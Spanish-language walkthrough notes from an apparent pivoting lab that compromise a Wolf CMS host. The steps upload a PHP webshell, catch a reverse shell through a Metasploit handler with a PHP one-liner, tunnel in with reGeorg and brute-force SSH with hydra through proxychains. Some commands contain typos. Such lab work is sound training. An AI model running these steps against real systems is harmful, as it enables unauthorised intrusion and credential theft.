
Vamos a ver el funcionamiento con un ejemplo:

host víctima: 192.143.107.3

El primer paso a realizar sera un escaner del host:

![[Pasted image 20250312092036.png]]

Parece que el servicio web del puerto 80 está siendo ejecutado con una tecnología llamada wolf cms. Si hacemos una búsqueda de exploits con ese nombre encontramos varios.

![[Pasted image 20250312092205.png]]

Tras realizar una búsqueda web se nos confirma que suele haber un panel de admin poniendo en la url "/?/admin/login".

![[Pasted image 20250312092341.png]]

Sabemos las credenciales pues es un lab de pivoting, así que nos las dan de serie:

User: robert
Pass: password1

Como hay un botón de subida de archivos, vamos a intentar subir una webshell ubicada en ``/usr/share/webshells/php/php-backdoor.php``.

![[Pasted image 20250312092916.png]]

Parece que está funcionando. Para conseguir una reverse shell vamos a utilizar metasploit

```bash
mfsconsole -q
use exploit/multi/handler
set payload php/reverse_php
set LHOST IP
exploit
```

En la web shell vamos a ejecutar el comando.

```
php -r '$sock=fspckopen("ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Con esto se nos debería activar una sesión en meterpreter y ya tendremos la reverse shell.

Si vemos el ``ipconfig`` de la reverse shell vemos que tiene una red interesante.

![[Pasted image 20250312093330.png]]

Desde la carpeta escritorio, en herramientas podemos ver la herramienta de reGeorg

![[Pasted image 20250312093421.png]]


La idea ahora es subir el tunnel al servidor víctima, para ello podemos utilizar el botón de upload de la propia web que tiene.


![[Pasted image 20250312093541.png]]

Una vez subido, creamos una nueva tab y ejecutamos.

```bash
python reGeorgSocksProxy.py -p 9050 -u http://182.143.107.3/public/tunnel.php
```

![[Pasted image 20250312093712.png]]

Desde ahora podemos abrir una nueva tab y realizar pruebas de conectividad al host2

```bash
proxychains nmap -sT -Pn host2
```


![[Pasted image 20250312093905.png]]

Como vemos que tiene ssh vamos a intentar hacer un ataque de fuerza bruta.

```bash
proxychains hydra -t 4 -l root -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-40.txt ssh://ip
```

![[Pasted image 20250312094127.png]]

